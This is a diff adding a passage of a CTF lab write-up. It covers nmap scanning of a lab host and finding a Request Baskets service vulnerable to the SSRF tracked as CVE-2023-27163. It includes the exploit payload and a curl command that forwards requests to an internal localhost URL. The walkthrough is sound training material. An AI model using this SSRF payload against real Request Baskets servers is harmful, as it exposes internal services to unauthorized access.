@@ -6,4 +6,90 @@ by Roqeeb
 ```
 nmap -sC -sV 10.10.11.224 -vvv -T3 -oN nmap
 ```
-After the scan was done we discovered two open ports opened ports 22 and 55555 ,due the speed of my scan i also got some false positives port 80 and 6003 with the ‘filtered’ state i will be ignoring because accessing them provides no response
+From our scan there are two open ports opened ports 22 and 55555 ,due the speed of my scan i also got some false positives port 80 and 6003 with the ‘filtered’ state i will be ignoring because accessing them provides no response
+
+
+
+```console
+# Nmap 7.92 scan initiated Tue Jul 25 06:28:06 2023 as: nmap -sC -sV -vvv -T3 -oN nmap2 10.10.11.224
+Increasing send delay for 10.10.11.224 from 0 to 5 due to 21 out of 69 dropped probes since last increase.
+Increasing send delay for 10.10.11.224 from 5 to 10 due to 11 out of 18 dropped probes since last increase.
+Increasing send delay for 10.10.11.224 from 10 to 20 due to 11 out of 30 dropped probes since last increase.
+Nmap scan report for 10.10.11.224
+Host is up, received conn-refused (0.13s latency).
+Scanned at 2023-07-25 06:28:07 WAT for 170s
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE REASON      VERSION
+22/tcp    open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
+|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
+|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
+80/tcp    filtered http    no-response
+6003/tcp  filtered X11:3   no-response
+55555/tcp open     unknown syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Tue, 25 Jul 2023 05:29:38 GMT
+|     Content-Length: 75
+|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Content-Type: text/html; charset=utf-8
+|     Location: /web
+|     Date: Tue, 25 Jul 2023 05:29:06 GMT
+|     Content-Length: 27
+|     href="/web">Found</a>.
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET, OPTIONS
+|     Date: Tue, 25 Jul 2023 05:29:07 GMT
+|_    Content-Length: 0
+```
+So i will start enumeration from port 55555 from our scan we can see there's a webserver running on that port,i opened it in my web browser and there's a site called request baskets, on the bottom left there's a version number
+![homepage](https://github.com/0xRoqeeb/writeups/assets/49154037/5e98fb0e-a7ff-41d3-9512-da0b43de3894)
+
+
+i started poking around the site to find out how it works, it's a application that allows you to create a basket with gives you a url and any request mcade to that basket will be collected on the site i.e the requests basket
+
+so i tested GET and POST requests on the url using curl i didnt get a response in my terminal but the requests were collected in the request basket
+
+```console
+┌──(mofe㉿mofe)-[~]
+└─$ curl http://10.10.11.224:55555/fourth                                                                                                                                                                          
+┌──(mofe㉿mofe)-[~]
+└─$ curl -X POST http://10.10.11.224:55555/fourth
+```
+![eq](https://github.com/0xRoqeeb/writeups/assets/49154037/a6bd4d84-8136-4da2-8ad2-3e4fcf09b3ee)
+
+so i created a new basket and intercepted the request with burp but it didn't reveal much
+after that i looked up the version number of requests basket online to check if this current version was vulnerable and i found out that it was susceptible to SSRF, it also has a POC [CVE-2023-27163]( https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)
+
+```console
+POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}
+```
+
+It turns out that the /api/baskets/name and /baskets/name are the  API endpoints vulnerable to unauthenticated SSRF.
+requests sent to the request basket url will be reflected on the url in the ***forward_url** parameter
+
+you can do this with a curl command
+
+```console
+curl --location 'http://10.10.11.224:55555/api/baskets/{name}' --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'
+```
+
+but i'll be doing it directly from the web application, to do that we navigate to out basket page and click on the settings icon top right
+![2023-07-25_08-51](https://github.com/0xRoqeeb/writeups/assets/49154037/d181f742-6a23-4fa0-84e5-889fb4bf1c7f)
+
+on the configuration page
